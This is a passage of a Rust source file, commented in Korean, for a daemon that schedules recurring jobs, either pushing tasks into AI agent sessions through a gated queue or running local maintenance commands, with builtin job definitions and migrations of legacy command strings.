//! Heartbeat 스케줄러 — 24/365 상주 데몬이 정해진 시각에 반복 업무를 발화한다.
//! cron과의 차이: 살아있는 AI 세션의 stdin에 자연어 과업을 push하고,
//! 대상 역할이 부재하면 launch-agent로 깨워서 주입한다.

use crate::state::{now_epoch, state_dir, Daemon, HideConsole};
use chrono::{Datelike, Local, NaiveTime, TimeZone};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

const TICK_SECS: u64 = 30;
/// ★(0.14.31 · WP-3 B) `via_queue` 잡의 enqueue 경로 태그(`QueueEntry::origin`) — 관통 추적용.
/// alert 라우팅의 `"alert"` 와 **다른 값**이다: 같은 큐에 들어가도 출처가 다르다(스케줄 발화 ↔
/// 데몬 경보). 배달 규칙은 origin 을 보지 않으므로 동작 차이는 없고 관측만 갈린다.
const SCHEDULE_QUEUE_ORIGIN: &str = "schedule";
/// ★(0.14.31 · 리뷰 R1 · codex blocking) 큐 경유가 **계약**인 push 의 action 이름.
/// 구 데몬(`fire()` 의 match 가 push·command 뿐)은 이 action 을 `unknown action` 으로 거절한다 —
/// 즉 데몬을 되돌려도 이 잡은 **주입되지 않는다**(게이트 없이 발화하느니 발화하지 않는 쪽).
pub(crate) const ACTION_PUSH_QUEUED: &str = "push_queued";
/// 구 데몬(v0.14.30 · 이 브랜치 이전)이 아는 action 전부 — 강등 안전성 핀의 대조군.
#[cfg(test)]
pub(crate) const LEGACY_ACTIONS: &[&str] = &["push", "command"];
/// `via_queue` 적재의 활성 큐 상한 — 기존 enqueue 3경로와 **같은 100**(경보와 달리 보호선을
/// 따로 두지 않는다: 시간당 1회 발화라 적체 축이 아니다).
const SCHEDULE_QUEUE_CAP: usize = 100;
/// ★(0.14.42 · 설계 H2) 직접 push 의 **하드축 우회 적재** 보호선(전체 깊이) — CSO 경보 보호선
/// ([`crate::alert_route::CSO_QUEUE_HEADROOM`] = 50)과 같은 선례다. 활성 큐 상한(100)의 나머지 50칸은 CLI
/// `send --queued`·`send-key --queued` 몫이다(부트 각성문 `javis_boot_node` --queued 4회 · javis_wakeup drain ·
/// report_gate · inject_text 타이핑 폴백 — 이 신호들이 우회 적재에 밀려 queue_full 이 되면 ③ 이다).
/// 넘으면 Err(queue_full) → schedule.error(종전 실패 방향). 노브를 끄면(HEAD) 종전 U8 P1 상한 100 이다.
const SCHEDULE_FALLBACK_HEADROOM: usize = 50;
/// ★(0.14.42 · 설계 H2) 틱의 pause 확인과 push 사이에 kill-switch 가 켜졌다 — via_queue 의 `Frozen` 과 같은 규약(ⓒ).
const SCHEDULE_FROZEN_ERR: &str = "delivery_frozen: kill-switch paused between tick and push";
/// ★(0.14.42 · R3SH-1) 입증 못 한 **기계 모양** 초안(사람 바이트 0) 위에서 같은 주기 잡이 같은 입력 세대로 사람 입력
/// 없이 이 횟수를 넘겨 연속 우회되면, 다음 회차는 종전(pre-H)처럼 직접 주입해 잔여를 병합 제출한다(푸는 주체 없는 무기한
/// 보류 차단 · 유계). 2 = 두 회차까지는 초안을 지키고 세 번째에 푼다(5분 잡이면 10분 · 1분 잡이면 2분).
/// 사람 바이트가 있는 초안(오너가 GUI 로 친 글자)은 이 폴백 대상이 아니다 — R3SH-2(오너 결재 대기)의 가시화만 받는다.
const SCHEDULE_DRAFT_DIVERT_MAX: u32 = 2;
/// 예정 시각보다 이만큼 늦게 발견하면 발화하지 않고 missed 처리 (데몬 다운 후 재시작 등)
const MISS_WINDOW_SECS: i64 = 600;
/// 반복(time) + fresh 조합에서 close_after_secs 미설정 시 적용하는 기본 TTL.
/// 매 발화가 유일 역할의 새 surface를 만드는데 회수 트리거가 없으면 24/365 데몬에서
/// surface·roles 맵·PTY fd가 단조 증가한다(원샷+fresh는 1회뿐이나 반복은 무한 누적).
/// close_after_secs를 명시하면 그 값이 우선 — 기본은 주입 과업이 끝날 여유를 둔 보수적 상한.
const FRESH_RECURRING_DEFAULT_TTL_SECS: u64 = 1800;
/// ★(0.14.31 · triage X9) 큐 경유 잡의 fresh 좌석 회수 **하한**(초). 큐 배달은 배달자 틱이
/// 초안·alt-screen·승인대기·빈 좌석 게이트를 통과시킨 뒤에야 주입하므로, 0초 회수는 "적재하고
/// 즉시 버린다" 와 같다.
const QUEUED_CLOSE_MIN_TTL_SECS: u64 = 60;
/// ★(성찰 A4) **배달 유예의 안내 경계**(초) — *회수 시각이 아니다.*
///
/// 종전 이름은 `QUEUED_CLOSE_MAX_WAIT_SECS` 였고 값이
/// [`FRESH_RECURRING_DEFAULT_TTL_SECS`] 와 **같은 상수**였다. 두 성질이 한 숫자에 묶여 있었다:
/// '누수 방지 주기'(좌석을 언제까지 살려 두는가)와 '배달 유예'(적재된 일감의 처분을 얼마나
/// 기다리는가). 그래서 승인 대기가 31분을 넘기면 활성 큐에 항목이 **남아 있는데도** 좌석이
/// 닫혔고, 그 항목은 `record_active_drain(…, "surface_closed")` + `queue.dropped` 로 폐기됐다 —
/// 잡의 일감은 끝내 실행되지 않는데 그 사실은 이미 `schedule.fired{detail:"queued"}`(성공)로
/// 보고된 뒤다. 이제 이 경계는 **안내 이벤트를 내는 시각**일 뿐이고, 미완료 항목이 있으면
/// 좌석을 닫지 않는다(대기의 실질 상한은 큐 항목 자신의 TTL 이 진다 — 배달·만료 어느 쪽이든
/// 처분이 정해지면 그 즉시 회수된다).
const QUEUED_DELIVERY_GRACE_SECS: u64 = 1800;
/// 유예를 넘긴 뒤 안내를 **되풀이하는** 간격(초) — 매 폴링마다 발행하면 관측이 소음이 된다.
const QUEUED_DEFER_NOTICE_INTERVAL_SECS: u64 = 900;
/// 처분 확인 간격(초).
const QUEUED_CLOSE_POLL_SECS: u64 = 5;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LaunchSpec {
    pub role: String,
    pub agent: String,
    #[serde(default)]
    pub cwd: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(remote = "Self")]
pub struct Job {
    pub id: String,
    /// "HH:MM" (로컬 시간). 원샷(at)·주기(every_minutes) job은 생략.
    #[serde(default)]
    pub time: Option<String>,
    /// 주기 발화 간격(분). 설정 시 time·at 대신 마지막 발화 후 N분마다 반복 발화한다
    /// (절대지침: master 5분 주기 진행% 보고의 하트비트). 0·미설정은 비활성.
    #[serde(default)]
    pub every_minutes: Option<u64>,
    /// T3-10 원샷: 절대 epoch 발화 시각 — 처리(발화/missed) 후 job은 파일에서 제거된다
    #[serde(default)]
    pub at: Option<i64>,
    /// T3-10: fresh surface를 발화 후 N초 뒤 자동 close (원샷+fresh의 surface 누수 차단)
    #[serde(default)]
    pub close_after_secs: Option<u64>,
    /// 비어 있으면 매일. ["mon","tue",...]
    #[serde(default)]
    pub days: Vec<String>,
    /// "push" | "command"
    pub action: String,
    #[serde(default)]
    pub to: Option<String>,
    #[serde(default)]
    pub text: Option<String>,
    /// push 액션 전용: 설정 시 이 셸 명령을 데몬이 실행해 그 stdout을 push 텍스트로 쓴다
    /// (결정론 환원: 진행% 산출 같은 도구 출력을 master 앞에 직접 놓아, master가 산출 주체가
    /// 아니라 전달자가 되게 한다). text와 함께 설정되면 text_command 우선.
    #[serde(default)]
    pub text_command: Option<String>,
    #[serde(default)]
    pub command: Option<String>,
    /// push 대상 역할 부재 시: "launch" | "skip"(기본)
    #[serde(default)]
    pub if_absent: Option<String>,
    /// true면 매 발화마다 새 surface를 기동해 주입 (권한·컨텍스트 상속 차단 — cron 격리)
    #[serde(default)]
    pub fresh: bool,
    /// ★T9(R3-P03-3): true 면 **base 데몬 전용** 잡 — 부서 소켓 데몬에서는 `fire()` 진입부의
    /// 단일 관문이 skip 한다(사유 이벤트 1줄). 배경: `ensure_builtin_jobs` 는 모든 cysd 가
    /// 무조건 호출하고(main.rs) schedule_path 는 CYS_PACK_DIR 을 따르므로 부서 데몬도 자기 팩
    /// schedule.json 에 builtin 을 복제 기록한다 — cys-dept 정상 경로는 seed_schedule 이 비워
    /// 주지만, cys 클라이언트 autostart 등 cys-dept 를 경유하지 않는 재기동에서는 seed 가 다시
    /// 돌지 않아 부서 데몬이 base 전용 잡을 실행한다. 추가-전용 스키마 규약(#[serde(default)])
    /// — 구 파일·구 데몬과 양방향 호환(미지 필드 무시·부재=false).
    #[serde(default)]
    pub base_only: bool,
    /// ★(0.14.31 · WP-3 B) true 면 push 를 **큐 경유**로 보낸다 — `fire_push` 의 직접 `inject`
    /// (§8 "스케줄 push 가 큐를 우회한다"의 그 지점)를 타지 않고 대상 좌석의 `pending_queue` 에
    /// 적재해, 배달자(watchdog 틱)가 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 **전부**
    /// 통과시킨 뒤에야 주입한다. 기본 false = 기존 잡 전원 무회귀(추가-전용 스키마 규약).
    ///
    /// 왜 잡마다 고르게 두는가: 직접 주입은 "지금 이 좌석에 즉시" 라는 의미가 필요한 잡
    /// (phoenix 스냅샷 등)의 계약이고, 큐 경유는 "좌석이 받을 준비가 됐을 때" 라는 의미다.
    /// 한쪽으로 통일하면 다른 쪽 잡의 의미가 조용히 바뀐다.
    #[serde(default)]
    pub via_queue: bool,
    #[serde(default)]
    pub launch: Option<LaunchSpec>,
}

/// ★(0.14.31 · 독립 판정 triage X8) **수용 시점 정규화** — `#[serde(remote = "Self")]` 는
/// 파생 구현을 연관함수로 내려두고, 그 위에 이 검증 계층을 씌우는 serde 의 표준 관용이다.
/// 여기가 "큐 경유가 계약인 잡" 의 단일 정규형(`action = push_queued`)을 세우는 지점이다.
impl<'de> Deserialize<'de> for Job {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let mut job = Job::deserialize(deserializer)?;
        job.canonicalize_queue_action();
        Ok(job)
    }
}

impl Serialize for Job {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        Job::serialize(self, serializer)
    }
}

impl Job {
    /// ★(triage X8) 큐 경유가 계약인 push 잡을 **구 데몬이 거절하는 표현**으로 정규화한다.
    ///
    /// 강등 안전의 전제는 "구 데몬이 이 잡을 실행하지 못한다" 이다. 그런데 문서가 **지원한다고
    /// 명시한** opt-in 표현(`action:"push" + via_queue:true`)은 구 데몬이 미지 필드를 무시하고
    /// `"push"` 로 읽어 **직접 주입**한다 — 초안·승인대기·alt-screen·빈 좌석 게이트가 통째로
    /// 사라진다. 두 표현은 같은 뜻이므로 저장·수용의 정규형을 하나로 접는다.
    ///
    /// `action` 이 `push` 인 경우에만 만진다 — `command` 등 **다른 action** 을 큐 표현으로
    /// 바꾸면 그것이 운영자 편집의 무언 소실이다(§B-5 · 같은 부류의 결함 X13).
    fn canonicalize_queue_action(&mut self) {
        if self.via_queue && self.action == "push" {
            self.action = ACTION_PUSH_QUEUED.to_string();
        }
    }

    /// 이 잡의 push 가 **큐를 경유해야 하는가**.
    ///
    /// 두 표현이 같은 뜻이다: ①`action:"push_queued"`(구 데몬이 **거절**하는 강등 안전 표현) ·
    /// ②`via_queue:true`(추가-전용 필드 · 기존 잡의 opt-in). 새 builtin 은 ①을 쓰고 ②를 함께
    /// 세운다 — 운영자가 action 을 손으로 `push` 로 되돌려도 신 데몬에서는 큐 경유가 유지된다.
    pub fn uses_queue(&self) -> bool {
        self.via_queue || self.action == ACTION_PUSH_QUEUED
    }
}

/// schedule_state.json 영속 스키마 버전 — 추가-전용 마이그레이션의 기준점.
const SCHEDULE_STATE_VERSION: u32 = 1;

#[derive(Debug, Default, Serialize, Deserialize)]
struct ScheduleState {
    /// 영속 스키마 버전. 구파일(필드 부재)은 serde default로 0으로 로드된다. 향후 필드 변경 시
    /// 이 버전을 올리고 변환기를 추가하라 — 기존 필드는 삭제·개명하지 말고 옆에 추가(추가-전용).
    #[serde(default)]
    schema_version: u32,
    /// job id → 마지막으로 처리(발화 또는 missed)한 예정 시각 epoch
    last_fired: HashMap<String, i64>,
}

pub fn schedule_path() -> PathBuf {
    cys::pack::pack_dir().join("schedule.json")
}

/// ★B2-1(W3): built-in 잡 정의 버전. 잡 내용이 바뀌면 올린다 — 부트 ensure 가 구버전 항목을 갱신하는 기준.
/// v2: R6 W0-4/W0-5 — cycle 전자동 잡 2종(cycle-autopilot-tick·cycle-verifier-watchdog) 추가.
const BUILTIN_JOBS_VERSION: u64 = 2;

/// built-in 잡 정의(phoenix 인프라 + learn 학습 루프) — 팩 schedule.json 배달이 아니라 코드가 소유한다
/// (schedule.json 이 user-owned 로 전환돼 팩 강제갱신이 사용자 잡을 보존하므로, built-in 잡 진화는 이 코드가
/// 담당). 각 항목에 `_builtin`/`_builtin_version` 마커를 달아 ensure 가 id 로 upsert·버전 대조한다(Job 의
/// 미지 필드는 serde 가 무시). text_command 는 R-CLI-4 게이트가 이 코드 정의와의 정확 일치로 신뢰한다.
/// ★(통합 2026-09-10 · 성찰 P3·P8) **표적 command 이관표** — `(id, 구 표현, 사유)`.
///
/// 왜 필요한가: `apply_builtin_jobs` 는 같은 id·같은 마커·**같은 `_builtin_version`** 이면
/// **무접촉**이다(중복 생성 0 이 그 계약). 그래서 builtin 의 `command` 문자열만 고치면 그 수정은
/// **기존 설치본에 영원히 닿지 않는다** — P3(편성 심박 `--cwd` 누락 = 에러 4 재발)·P8(승격 틱
/// 좌석 신원 누출 = 10분마다 조용한 exit 7)이 신규 설치에서만 고쳐지고 실제 피해 함대에서는
/// 그대로 남는다. 전역 `BUILTIN_JOBS_VERSION` 범프는 반대편 절벽이다: 그 순간 **모든** builtin 이
/// 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실된다(§B-5 금지).
///
/// 그래서 `action` 이관(위 X13 선례)과 **같은 규율**을 쓴다 — 이관 대상은 구 빌드가 심은
/// **정확히 그 바이트열**뿐이고, 한 글자라도 다르면 운영자 편집으로 보고 건드리지 않는다.
/// 실패 방향: 표에 없는 편집은 그대로 남는다(무접촉 = 종전 거동 · 침묵 소실 0).
///
/// ★(성찰 2회 · 3/3) 세 번째 원소 `사유` 는 이관 로그가 **맞은 항목의 결함**만 찍기 위한 것이다 —
/// 종전엔 P3·P8 을 고정 나열해 WP6-5 이관에도 남의 사유가 찍혔다.
///
/// ★(성찰 2회 · 3/3) **dcfc728 의 중간 표현(`… --json || rc=1; done; exit $rc`)은 표에 넣지 않는다.**
/// 그 표현은 어떤 태그에도 없다(`git tag --contains dcfc728` = 공집합 · 최신 태그 v0.14.33 의 조상
/// 아님 · 이후 릴리스 범프 커밋 없음) = 미릴리스 — 설치본이 심은 적이 없는 바이트열은 이관 대상이
/// 아니다(표는 "구 빌드가 실제로 심은 것" 만 담는다). 실패 방향: 그 표현을 손으로 심은 설치본이
/// 있다면 무접촉(운영자 편집으로 취급 · 종전 거동 유지 · 소실 0).
const BUILTIN_COMMAND_MIGRATIONS: &[(&str, &str, &str)] = &[
    // P3: `--cwd` 없이 편성을 재생성하던 심박(구 표현).
    (
        "formation-heartbeat",
        "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" --json || true; done",
        "P3 편성 cwd 누락",
    ),
    // P8: `CYS_ROLE` 하나만 지우던 승격 틱(구 표현) — `CYS_SURFACE_ID` 로 좌석 신원이 샜다.
    (
        "ceo-promote-pending-tick",
        "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; env -u CYS_ROLE \"$pk/bin/cys-dept\" promote-if-pending",
        "P8 좌석 신원 누출",
    ),
    // WP6-5: ensure 비0 exit를 삼키던 심박(현재 builtin의 구 표현, 바이트 일치 이관).
    (
        "formation-heartbeat",
        "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; c=\"$(\"$pk/bin/cys-dept\" cwd \"$d\" 2>/dev/null)\" || c=\"\"; python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" ${c:+--cwd \"$c\"} --json || true; done",
        "WP6-5 ensure 비0 exit 삼킴(부서 실패 불가시)",
    ),
    // ★U10(0.14.41): 부서 편성을 본부 팩 env 로 돌리던 심박(0.14.40 builtin 의 바이트 정확 사본).
    (
        "formation-heartbeat",
        "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; rc=0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; c=\"$(\"$pk/bin/cys-dept\" cwd \"$d\" 2>/dev/null)\" || c=\"\"; python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" ${c:+--cwd \"$c\"} --json || { rc=1; echo \"formation-heartbeat: ensure failed dept=$d\" >&2; }; done; exit $rc",
        "U10 부서 편성이 본부 팩으로 돎(부서 좌석에 본부 지침 주입·각성 훅 오탐 누적)",
    ),
];

fn builtin_jobs() -> Vec<serde_json::Value> {
    vec![
        json!({
            "id": "phoenix-snapshot-6h",
            "every_minutes": 360,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 세대 스냅샷 정기화(6h·P2-4) — 손상 치유 소스 최신화.\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1 | tail -3",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "phoenix-drill-weekly",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 주간 격리 드릴(원자성·중단내성 self-test·라이브 무접촉) — 실전이 첫 테스트인 상태 종료(축E E2).\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1 | tail -5",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // (learn gaps C12③) RSI 학습 루프 정기 잡 — G1 audit 구동자(일 1회)·G5 fleet digest(주 1회).
        // CYS_ROUND_DIR 핀: 데몬 cwd 의존(_round) 대신 canonical ~/.cys/state/learn 고정
        // (launchd cwd=/ 사고 이력·설계안 §3 G5) — 데몬 learn_state_dir 규약과 동일(env 설정 시 승계).
        json!({
            "id": "learn-ttl-audit",
            "every_minutes": 1440,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] RSI 학습 TTL 감사(일 1회·G1) — 만기 tombstone·재검 wakeup·lapse 강등·refs 대조의 결정론 산출이다. hard-fail 항목은 능동 조치하라.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" JAVIS_ROOT=\"${JAVIS_ROOT:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_learn.py\" audit --json",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "fleet-digest",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] 주간 fleet digest(G5) — 채택 학습물·사후 효과(ROI)·게이트 지출의 결정론 read-only 집계다. 수치 불변으로 보고하라. 추천 0건 지속=게이트 비용 재조정 검토 트리거.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_fleet_report.py\" --days 7 2>&1 | tail -40",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── (R6 W0-4) cycle 전자동 틱 — javis_cycle_autopilot.py tick 매분 구동 ──────────
        // ★action="command" 핀(크리틱 B3 ①): 이 잡을 push 로 만들면 매분 master stdin 에
        //   기계 문안이 꽂힌다(폭주 — 라운드1 홍수 결함군 재생산). command 레인(fire_command)
        //   은 stdin 주입 0 이고, R-CLI-4 정확일치 게이트는 text_command(push 레인) 전용이라
        //   command 레인과 충돌하지 않는다 — 선례: pack seed 의 owner-progress-gate-5min
        //   (GUIDE-fullauto-cycle §3 배선안과 동일 레인).
        // ★모드/역할은 STATE_DIR/mode·roles **파일 채널**(javis_cycle_autopilot.mode()/roles()):
        //   command 문자열에 CYS_AUTOPILOT_MODE=live 접두를 심으면, 이 잡은 `_builtin` 마커
        //   잡이라 BUILTIN_JOBS_VERSION 범프 때 apply_builtin_jobs 가 코드 정의로 통째 교체 —
        //   live 가 shadow 로 **무언 회귀**한다(크리틱 B3 ②). 파일 채널은 잡 문자열과 독립이라
        //   버전 범프에 살아남는다.
        // ★shadow 기본이라 이 배선 자체는 무해 — tick 은 would_fire 를 원장에 기록만 하고
        //   아무것도 발화하지 않는다(live 승격은 운영자의 STATE_DIR/mode 파일이 별도 수행).
        //   tick 은 정상 skip 도 exit 0([v2.1 ③] 계약)이라 `; exit 0` 꼬리 불요 — 비0 은
        //   진짜 내부 오류뿐이고 그것만 schedule.error 로 표면화되는 것이 의도다.
        json!({
            "id": "cycle-autopilot-tick",
            "every_minutes": 1,
            "action": "command",
            "command": "CYS_PROJECT_ROOT=\"${CYS_PROJECT_ROOT:-$HOME}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_cycle_autopilot.py\" tick",
            "_builtin": "cycle",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── (R6 W0-5) 검증자 워치독 — bootstrap-verifier --ensure 10분 주기 ────────────
        // --ensure 는 멱등(P0-1): 검증자 surface 실재 + heartbeat 신선이면 no-op exit 0 —
        // 건강 상태에서 중복 pane 생성 0. 죽은/부재 워처만 현행 기동 로직으로 재기동한다.
        // action="command" 이유·모드 파일 채널·shadow 무해성은 위 tick 잡 주석과 동일.
        json!({
            "id": "cycle-verifier-watchdog",
            "every_minutes": 10,
            "action": "command",
            "command": "CYS_PROJECT_ROOT=\"${CYS_PROJECT_ROOT:-$HOME}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_cycle_autopilot.py\" bootstrap-verifier --ensure",
            "_builtin": "cycle",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★T9(P3-1 ⓑ) 상비편성 심박 — 10분 틱으로 전 부서 formation ensure ────────────
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3: 신규 id 는 버전 무관
        // append(:None→push) — 범프하면 기존 builtin 6종이 코드 정의로 통째 교체돼 운영자 수기
        // 편집이 무언 소실된다). 부서 팩 schedule 은 seed_schedule 이 설계상 비우므로 이 틱의
        // 소유는 **base 데몬**이고, base_only+fire() 관문이 부서 데몬 복제 실행을 차단한다.
        // command 레인(스케줄 push 아님 — master stdin 무주입)·`--force-surface` 금지
        // (javis_formation._surface: 주기 잡에 붙이면 매 틱 토스트 스팸). ensure 자체가
        // 소켓키 싱글플라이트+시도 원장(역할당 MAX 3·쿨다운)으로 유계라 10분 틱이 폭주 축이
        // 되지 않는다(P3-1 폭주 앵커 ① 방어). agent 전멸 부서의 유일 자동 복구 경로(치명 ③).
        // ★한계(SF-3·기지): 전 부서를 fire_command 단일 600s 캡 안에서 직렬 순회
        // — _boot_node 역할당 200s 상한이라 편성 폭풍 시 1부서만으로 캡 초과 가능. fire_command
        // 는 kill_on_drop 미설정이라 타임아웃해도 자식은 완주(작업·원장 정상 — 폭주 아님)하고
        // 그 틱에 'command timed out' 오보 1줄만 남는다. 부서당 timeout 래핑은 플랫폼별
        // timeout(1) 가용성이 갈려 보류(coreutils 비보장 — macOS 기본엔 없음).
        // ★한계(R3-WINTICK-5 · 2026-08-26): 이 페이로드는 POSIX 셸 문법(`${VAR:-}`·`$( )`·
        //   `for … do … done`)이라 Windows 에서 `command_shell()` 이 **cmd /C 로 폴백하면
        //   매 틱 실패**한다. 그 폴백 조건은 동봉 `runtime\git\...\bash.exe` 결손 — 즉 P4-2
        //   advisory 가 진단하는 상태와 **같은 근본원인**이고, 파일 하나가 ⓐ훅 전면 무발화
        //   (U-20) ⓑ이 편성 심박(agent 전멸 부서의 유일 자동 복구) ⓒ아래 승격 집행 틱을
        //   동시에 끊는다. 사용자 가시화는 그 advisory 본문이 담당한다(lib.rs
        //   `windows_runtime_damage_notice` — 회귀 핀 `windows_runtime_damage_notice_contract`
        //   가 파급 고지 문언을 단언). 여기 관측은 schedule.warning/error 버스 이벤트뿐이다.
        json!({
            "id": "formation-heartbeat",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            // 실패 방향: 부서별 실패를 누적해 표면화하되 나머지 부서·다음 주기 복구는 계속한다.
            // ★(성찰 2회 · 3/3) 실패 **부서를 지목**한다 — `fire_command` 는 stderr 꼬리 200자만 남기므로
            //   `rc=1` 만으로는 어느 부서가 실패했는지 알 수 없었다. 실패 분기에서 stderr 로
            //   `formation-heartbeat: ensure failed dept=<부서>` 1줄을 낸다(팩의 예외 메시지 뒤에 붙어
            //   꼬리 200자 안에 부서명이 남는다). 실패 방향: 여러 부서가 실패하면 꼬리에는 마지막
            //   부서만 남을 수 있다(앞선 부서는 잘림) — 0 이 아니라 ≥1 을 지목한다.
            // ★exit 1 도달 범위(정직 · 팩 `_cmd_ensure` 의 `return 1 if state_kind(state) == "failed" else 0` 과 정합): `javis_formation.py ensure`
            //   는 `state_kind(state) == "failed"` 일 때만 1 을 돌리는데, `classify()`·`ensure()` 의
            //   반환 집합은 complete / partial:* / pending-cli:* / pending-resource 뿐이라 `failed` 에 닿는
            //   길은 **최후 catch-all(`except Exception` → state="failed:<예외명>")** 하나고, 그 밖의 비0
            //   은 **인터프리터 사고**(python3 부재·구문 오류·SystemExit·시그널)다. held(시도 원장 보류)·
            //   pending-*·partial:*(booting·inflight·paused·gate-unknown) 은 전부 **0** 이라 rc 로는 보이지
            //   않는다(상태파일 held/gate 키가 흔적). 즉 이 잡의 exit 1 = "예외로 편성이 failed 로 확정"
            //   또는 "파이썬이 못 돌았다" 이며, 평시 심박 소음이 아니다.
            // ★U10(0.14.41 · 반박 M1/DD1): 부서마다 **그 부서 팩**으로 편성을 돌린다(`lp` · cys-dept `dept_pack` 과
            //   같은 규칙 `$HOME/.cys/pack-dept-<d>`). 종전엔 본부 데몬 env 의 팩으로 돌아, 죽은 부서 좌석을 되살릴
            //   때마다 본부 지침·MEMORY 를 부서 좌석에 주입하고 각성 훅 경고를 오탐으로 쌓았다. 부서 팩이 설치
            //   전(boot_node 부재)이면 `$pk`(종전 값)로 접는다 — 편성이 'boot_node 부재' 실패로 번지지 않는다(③).
            //   본부 팩에 kill-switch 파일(AUTOPILOT_PAUSED)이 있어도 `$pk` 로 접는다 — 종전엔 그 파일이 부서 편성도
            //   멈췄다(javis_formation paused_paths = `$PACK_DIR/AUTOPILOT_PAUSED`) · 팩 전환이 정지를 우회하지 않는다.
            //   CYS_STATE_DIR 무접촉(편성 싱글플라이트 락 불변식). 기존 설치본은 아래 이관표(U10 항목)로 닿는다.
            "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; [ -f \"$pk/bin/javis_formation.py\" ] || exit 0; rc=0; for d in $(\"$pk/bin/cys-dept\" list 2>/dev/null); do s=\"$(\"$pk/bin/cys-dept\" sock \"$d\" 2>/dev/null)\" || continue; [ -n \"$s\" ] || continue; c=\"$(\"$pk/bin/cys-dept\" cwd \"$d\" 2>/dev/null)\" || c=\"\"; lp=\"$HOME/.cys/pack-dept-$d\"; { [ -f \"$lp/bin/javis_boot_node.py\" ] && [ ! -e \"$pk/AUTOPILOT_PAUSED\" ]; } || lp=\"$pk\"; CYS_PACK_DIR=\"$lp\" python3 \"$pk/bin/javis_formation.py\" ensure --socket \"$s\" ${c:+--cwd \"$c\"} --json || { rc=1; echo \"formation-heartbeat: ensure failed dept=$d\" >&2; }; done; exit $rc",
            "_builtin": "formation",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★T10(P3-2) 대기형 CEO 승격 집행 틱 — 신호(부트 ⑦ request-only)/집행 분리의 집행 레인 ──
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3: 신규 id 는 버전 무관
        // append — 범프하면 기존 builtin 이 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실).
        // 실행 주체 계약(P3-2 revised_design): 집행은 base 데몬 스케줄 틱의 **role-less** 주체 —
        // cys-dept 단일소유 가드(roled 세션 대기형 exit 7)·승격 조건 3중(CEO_PENDING+BOOT_MARKER+
        // 부서≥1)·부트마커 게이트·A11 dedupe 는 전부 cys-dept 내부 소관(무수정). `env -u CYS_ROLE`
        // 은 roled pane 이 띄운 데몬의 env 상속까지 결정론 차단해 '틱=role-less 주체' 계약을
        // 기계로 만든다(가드 완화가 아니라 지정 집행자의 신원 고정 — 가드 자체는 무접촉).
        // 조건 미충족이면 no-op exit 0 멱등(폭주 축 아님 — 승격 자체도 파일 스왑 1회+flock 직렬화·
